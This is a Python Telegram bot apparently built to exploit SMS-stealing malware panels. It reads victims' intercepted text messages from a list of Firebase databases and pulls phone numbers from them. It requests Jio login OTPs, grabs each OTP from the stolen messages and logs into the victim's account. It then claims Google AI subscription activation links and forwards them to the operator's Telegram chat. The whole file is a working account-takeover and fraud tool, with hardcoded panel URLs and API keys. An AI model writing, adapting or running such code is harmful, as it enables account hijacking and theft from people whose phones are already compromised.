"""
Jio Gemini Activation Scanner - TELEGRAM BOT & RENDER EDITION
Flow: Telegram Command (/run) → All Panels → Online Devices → Unique Numbers → Process Links & Send to Telegram
"""

from __future__ import annotations
import csv
import html
import re
import time
import base64
import os
import threading
from collections import Counter, defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import unquote
from zoneinfo import ZoneInfo, ZoneInfoNotFoundError
from flask import Flask
import telebot

import requests

# ==================== TELEGRAM & WEB SERVER CONFIG ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("Error: BOT_TOKEN must be set in Environment Variables.")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

@app.route('/')
def alive():
    return "Bot is running online on Render!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

ADMIN_CHAT_ID = 1847021130

# ==================== TIMEZONE SAFE CONFIG ====================
def configured_timezone() -> ZoneInfo:
    timezone_name = os.getenv("APP_TIMEZONE", "Asia/Kathmandu")
    try:
        return ZoneInfo(timezone_name)
    except ZoneInfoNotFoundError:
        try:
            import tzdata
            return ZoneInfo(timezone_name)
        except Exception:
            return ZoneInfo("UTC")

TIMEZONE = configured_timezone()

# ==================== ALL PANELS (DECODED FROM NETLIFY URLS) ====================
FIREBASE_PANELS = [
    ("https://cep10hui-default-rtdb.firebaseio.com", "https://cep10hui-default-rtdb.firebaseio.com"),
    ("https://tinobiggan-default-rtdb.firebaseio.com", "https://tinobiggan-default-rtdb.firebaseio.com"),
    ("https://atifgndu-default-rtdb.firebaseio.com", "https://atifgndu-default-rtdb.firebaseio.com"),
    ("https://jsisbeuve-default-rtdb.firebaseio.com", "https://jsisbeuve-default-rtdb.firebaseio.com"),
    ("https://fir-27c9e-default-rtdb.firebaseio.com", "AizAsyA7EOpeZLDxPAYcS2_nb1J2ZKr4TNCgp6Q"),
    ("https://rupesh-6c5e5-default-rtdb.firebaseio.com", "AizAsyAFML11FrkfFMx0c4hOYqaCKUNVj5f8XhA"),
    ("https://desi-742d2-default-rtdb.firebaseio.com", "https://desi-742d2-default-rtdb.firebaseio.com"),
    ("https://santosh-8-default-rtdb.firebaseio.com", "https://santosh-8-default-rtdb.firebaseio.com"),
    ("https://yqhw2-fb47-default-rtdb.firebaseio.com", "AizAsyAdvY2CkMHoY3Ww_ah6b0pFdNKNTHKZnypUY"),
    ("https://ikka-83d65-default-rtdb.firebaseio.com", "https://ikka-83d65-default-rtdb.firebaseio.com"),
    ("https://master-panel-6bcfc-default-rtdb.firebaseio.com", "https://master-panel-6bcfc-default-rtdb.firebaseio.com"),
    ("https://landelle-20855-default-rtdb.firebaseio.com", "https://landelle-20855-default-rtdb.firebaseio.com"),
    ("https://autobot7-214ee-default-rtdb.firebaseio.com", "https://autobot7-214ee-default-rtdb.firebaseio.com"),
    ("https://shilpa-e712a-default-rtdb.firebaseio.com", "https://shilpa-e712a-default-rtdb.firebaseio.com"),
    ("https://dath-da88a-default-rtdb.firebaseio.com", "https://dath-da88a-default-rtdb.firebaseio.com"),
    ("https://apkdir-default-rtdb.firebaseio.com", "https://apkdir-default-rtdb.firebaseio.com"),
    ("https://apkpure-6eb6a-default-rtdb.firebaseio.com", "https://apkpure-6eb6a-default-rtdb.firebaseio.com"),
    ("https://hdjdjdj-a73f2-default-rtdb.firebaseio.com", "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com"),
    ("https://yogeshbhaitumchuitya-default-rtdb.firebaseio.com", "https://yogeshbhaitumchuitya-default-rtdb.firebaseio.com"),
    ("https://anvith6-9450e-default-rtdb.firebaseio.com", "https://anvith6-9450e-default-rtdb.firebaseio.com"),
    ("https://jayma-9ce22-default-rtdb.firebaseio.com", "https://jayma-9ce22-default-rtdb.firebaseio.com"),
    ("https://konaio-default-rtdb.firebaseio.com", "https://konaio-default-rtdb.firebaseio.com"),
    ("https://kitter-34345-default-rtdb.firebaseio.com", "https://kitter-34345-default-rtdb.firebaseio.com"),
    ("https://apkdir-f6fb9-default-rtdb.firebaseio.com", "https://apkdir-f6fb9-default-rtdb.firebaseio.com"),
    ("https://vibe-d238e-default-rtdb.firebaseio.com", "https://vibe-d238e-default-rtdb.firebaseio.com"),
    ("https://alienware-c11b0-default-rtdb.firebaseio.com", "https://alienware-c11b0-default-rtdb.firebaseio.com"),
    ("https://csforme-dc64a-default-rtdb.firebaseio.com", "AizAsyCEk7GmmKKwJSCAjCDIxOa8AISQZyxy6bw"),
    ("https://max-a-cbe29-default-rtdb.firebaseio.com", "AizAsyCQeygjNYLwmbf_ZC86gvRye7XBI-BIBawq"),
    ("https://raaz-5287d-default-rtdb.firebaseio.com", "Hebdixnd"),
    ("https://singhaan-6f199-default-rtdb.firebaseio.com", "AizAsyD-1Gvt2cmr0mv1x0K4V9vtjVMXyJVLAv"),
    ("https://painislv-default-rtdb.firebaseio.com", "AizAsyCqnjDPgVCaE36q7N4HbdfUEB9FbluM8pDs"),
    ("https://risho-d4c66-default-rtdb.firebaseio.com", "AizAsyBkccFcNJ-FfClxHMzrRAyropULYvexsW0"),
    ("https://runjun-master-panel-default-rtdb.firebaseio.com", "AizAsyBawSxrOxhTZk7C2V0-LkcoyEs7n6y4msw"),
    ("https://tinmn88-b7db5-default-rtdb.firebaseio.com", "AizAsyBDanswTNTm4-E7v4wCX-_WsQ0A8ZaDIf"),
    ("https://e14turnament2-default-rtdb.firebaseio.com", "AizAsyBIJawvyJ8SHeZ14iLesyx4bAOr8EPGt"),
    ("https://newspreding-default-rtdb.firebaseio.com", "AizAsyDsWt99EDO-HdTmG3U9tARSElpki13JWFo"),
    ("https://bossbun-default-rtdb.firebaseio.com", "AizAsyBfqObM5HnK6khogyF4ytOX7E9N0e_lAQ"),
    ("https://jpicku-47790-default-rtdb.firebaseio.com", "https://jpicku-47790-default-rtdb.firebaseio.com"),
    ("https://shivalmpanel-eb3b7-default-rtdb.firebaseio.com", "https://shivalmpanel-eb3b7-default-rtdb.firebaseio.com"),
    ("https://annu-f0207-default-rtdb.firebaseio.com", "https://annu-f0207-default-rtdb.firebaseio.com"),
    ("https://strange-2e4aa-default-rtdb.firebaseio.com", "https://strange-2e4aa-default-rtdb.firebaseio.com"),
    ("https://customer-support-5-default-rtdb.firebaseio.com", "https://customer-support-5-default-rtdb.firebaseio.com"),
    ("https://gandhi-ji-1-default-rtdb.asia-southeast1.firebaseio.com", "https://gandhi-ji-1-default-rtdb.asia-southeast1.firebaseio.com"),
    ("https://muajob-29c86-default-rtdb.firebaseio.com", "https://muajob-29c86-default-rtdb.firebaseio.com"),
    ("https://totala-panel-default-rtdb.firebaseio.com", "https://totala-panel-default-rtdb.firebaseio.com"),
    ("https://kingu-2dbb9-default-rtdb.firebaseio.com", "https://kingu-2dbb9-default-rtdb.firebaseio.com"),
    ("https://rajabhaya-default-rtdb.firebaseio.com", "https://rajabhaya-default-rtdb.firebaseio.com"),
    ("https://heisenberg-8c3da-default-rtdb.firebaseio.com", "https://heisenberg-8c3da-default-rtdb.firebaseio.com"),
    ("https://customer-support-12e40-default-rtdb.firebaseio.com", "https://customer-support-12e40-default-rtdb.firebaseio.com"),
    ("https://sada-bcbcd-default-rtdb.firebaseio.com", "https://sada-bcbcd-default-rtdb.firebaseio.com"),
    ("https://bharat56-b6ee1-default-rtdb.firebaseio.com", "https://bharat56-b6ee1-default-rtdb.firebaseio.com"),
    ("https://phone55-d7d89-default-rtdb.firebaseio.com", "https://phone55-d7d89-default-rtdb.firebaseio.com"),
    ("https://e9turnament1-default-rtdb.firebaseio.com", "https://e9turnament1-default-rtdb.firebaseio.com"),
    ("https://colana-84ce2-default-rtdb.firebaseio.com", "https://colana-84ce2-default-rtdb.firebaseio.com"),
    ("https://hospital-14-default-rtdb.firebaseio.com", "https://hospital-14-default-rtdb.firebaseio.com"),
    ("https://vdgsh-623ed-default-rtdb.firebaseio.com", "https://vdgsh-623ed-default-rtdb.firebaseio.com"),
    ("https://arvind-c5b03-default-rtdb.firebaseio.com", "https://arvind-c5b03-default-rtdb.firebaseio.com"),
    ("https://axisjames-default-rtdb.firebaseio.com", "https://axisjames-default-rtdb.firebaseio.com"),
    ("https://mafiaaaa2oppp-default-rtdb.firebaseio.com", "AizAsyBl3179G60c2LzYPrbkp4tmuRKK_7H0_0g"),
    ("https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app", "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://krijhjuiiccyy-default-rtdb.firebaseio.com", "https://krijhjuiiccyy-default-rtdb.firebaseio.com"),
    ("https://youbabu-default-rtdb.firebaseio.com", "https://youbabu-default-rtdb.firebaseio.com"),
    ("https://kali-1b217-default-rtdb.firebaseio.com", "https://kali-1b217-default-rtdb.firebaseio.com"),
    ("https://sallu-9934f-default-rtdb.firebaseio.com", "https://sallu-9934f-default-rtdb.firebaseio.com"),
    ("https://chinky-d92ab-default-rtdb.firebaseio.com", "https://chinky-d92ab-default-rtdb.firebaseio.com"),
    ("https://loddysingh-6d511-default-rtdb.firebaseio.com", "https://loddysingh-6d511-default-rtdb.firebaseio.com"),
    ("https://simadevi-f42fc-default-rtdb.firebaseio.com", "https://simadevi-f42fc-default-rtdb.firebaseio.com"),
    ("https://olamigo-41620-default-rtdb.firebaseio.com", "https://olamigo-41620-default-rtdb.firebaseio.com"),
    ("https://anup-f900e-default-rtdb.firebaseio.com", "https://anup-f900e-default-rtdb.firebaseio.com"),
    ("https://bishnu-a0e01-default-rtdb.firebaseio.com", "https://bishnu-a0e01-default-rtdb.firebaseio.com"),
    ("https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app", "https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://hdhdusgsvshshshs-default-rtdb.firebaseio.com", "https://hdhdusgsvshshshs-default-rtdb.firebaseio.com"),
    ("https://sastaapp-394cd-default-rtdb.firebaseio.com", "https://sastaapp-394cd-default-rtdb.firebaseio.com"),
]

MESSAGE_SCAN_LIMIT = 100
OTP_TIMEOUT = 15
POLL_INTERVAL = 1

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification|code")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

# ==================== FUNCTIONS ====================

def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    query = {"auth": key}
    if params:
        query.update(params)
    if key and key.startswith("http"):
        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=20)
        response.raise_for_status()
        return response.json()
    response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=20)
    response.raise_for_status()
    return response.json()

def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
    if not isinstance(data, dict):
        return {}
    return {name: value for name, value in data.items() if isinstance(value, dict)}

def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
    found: set[str] = set()
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        body = str(item.get("message", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
    return found

def firebase_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
    return session

def jio_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return session

def response_json(response: requests.Response) -> dict[str, Any]:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}

def response_error(response: requests.Response) -> bool:
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def is_jio_number(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
    except requests.RequestException:
        return False
    data = response_json(response)
    return not response_error(response) and bool(data.get("primaryService"))

def send_otp(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            timeout=20,
        )
    except requests.RequestException:
        return False
    return not response_error(response)

def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        response = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(response)

def message_order(key: str, item: dict[str, Any]) -> int:
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0

def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
    used: set[str] = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(POLL_INTERVAL)
            continue
        candidates: list[tuple[int, str, str]] = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False

def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed"
    ))

def api_message(data: dict[str, Any]) -> str:
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""

def get_activation(session: requests.Session) -> tuple[str, str]:
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        activate_data = response_json(activate_response)
        if already_active(api_message(activate_data)):
            return "already_active", ""
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_response)
        if already_active(api_message(google_data)):
            return "already_active", ""
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""

# ==================== TELEGRAM COMMAND HANDLER ====================

@bot.message_handler(commands=['run'])
def handle_run_command(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
        return
    
    bot.reply_to(message, "🚀 စစ်ဆေးမှု စတင်နေပါပြီ ခဏစောင့်ပါ...")
    threading.Thread(target=main_process, args=(message.chat.id,), daemon=True).start()

# ==================== MAIN PROCESS ====================

def main_process(chat_id: int) -> int:
    bot.send_message(chat_id, "🔍 STEP 1: Panels များကို စစ်ဆေးပြီး Online Devices များ စုဆောင်းနေပါပြီ...")
    
    all_online_devices: dict[str, dict[str, Any]] = {}
    device_messages: dict[str, dict[str, dict[str, Any]]] = {}
    
    for panel_idx, (base_url, firebase_key) in enumerate(FIREBASE_PANELS, start=1):
        firebase = firebase_session()
        try:
            if firebase_key and firebase_key.startswith("http"):
                response = firebase.get(f"{base_url}/clients.json", timeout=10)
            else:
                response = firebase.get(f"{base_url}/clients.json?auth={firebase_key}", timeout=10)
            
            if response.status_code == 200:
                clients = response.json()
                if isinstance(clients, dict):
                    for device_id, data in clients.items():
                        if isinstance(data, dict) and data.get("status") is True:
                            all_online_devices[device_id] = {
                                "base_url": base_url,
                                "firebase_key": firebase_key,
                                "firebase_session": firebase,
                                "data": data,
                            }
        except Exception:
            pass
    
    if not all_online_devices:
        bot.send_message(chat_id, "❌ Online ရှိသော Device တစ်ခုမှ မတွေ့ပါ။")
        return 1
    
    mappings: dict[str, set[str]] = defaultdict(set)
    for device_id, info in all_online_devices.items():
        try:
            messages = latest_messages(
                info["firebase_session"],
                info["base_url"],
                info["firebase_key"],
                device_id,
                MESSAGE_SCAN_LIMIT,
            )
            device_messages[device_id] = messages
            for mobile in number_candidates(messages):
                mappings[mobile].add(device_id)
        except Exception:
            device_messages[device_id] = {}
    
    targets: list[tuple[str, str]] = []
    for mobile, devices in sorted(mappings.items()):
        if devices:
            targets.append((sorted(devices)[0], mobile))
    
    if not targets:
        bot.send_message(chat_id, "❌ ဖုန်းနံပါတ် Candidate တစ်ခုမှ မတွေ့ပါ။")
        return 1
    
    bot.send_message(chat_id, f"🎯 တွေ့ရှိသော Unique Numbers စုစုပေါင်း: {len(targets)} ခု။ OTP + Activation စတင်နေပါပြီ...")
    
    statuses: Counter[str] = Counter()
    for serial, (device_id, mobile) in enumerate(targets, start=1):
        info = all_online_devices.get(device_id)
        if not info:
            continue
        base_url = info["base_url"]
        firebase_key = info["firebase_key"]
        firebase = info["firebase_session"]
        device = info["data"]
        
        if not isinstance(device, dict) or device.get("status") is not True:
            status, url = "device_offline", ""
        else:
            jio = jio_session()
            if not is_jio_number(jio, mobile):
                status, url = "not_jio_number", ""
            else:
                known_keys = set(device_messages.get(device_id, {}))
                if not send_otp(jio, mobile):
                    status, url = "otp_send_failed", ""
                elif not wait_for_otp(firebase, base_url, firebase_key, device_id, known_keys, jio, mobile):
                    status, url = "otp_failed", ""
                else:
                    status, url = get_activation(jio)
                    
        statuses[status] += 1
        
        # ဖုန်းထဲသို့ ဖိုင်အဖြစ် Save မည့်အစား Telegram Bot မှ တိုက်ရိုက် လှမ်းပို့ပေးမည်
        if url:
            success_msg = f"✅ <b>Activation အောင်မြင်ပါသည်!</b>\n📱 ဖုန်းနံပါတ်: <code>{mobile}</code>\n🔗 လင့်ခ်: {url}"
            bot.send_message(chat_id, success_msg, parse_mode="HTML", disable_web_page_preview=True)
            
    # FINAL SUMMARY
    summary_text = f"📊 <b>စစ်ဆေးမှု ပြီးဆုံးပါပြီ (FINAL SUMMARY)</b>\n\n"
    summary_text += f"📱 Online Devices : {len(all_online_devices)}\n"
    summary_text += f"🎯 Unique Numbers : {len(targets)}\n\n"
    for status, count in sorted(statuses.items()):
        summary_text += f"▪️ {status}: {count} ခု\n"
        
    bot.send_message(chat_id, summary_text, parse_mode="HTML")
    return 0

# ==================== MAIN EXECUTION ====================

if __name__ == "__main__":
    print("Starting Web Server and Bot...")
    t_web = threading.Thread(target=run_web, daemon=True)
    t_web.start()
    bot.infinity_polling(skip_pending=True)
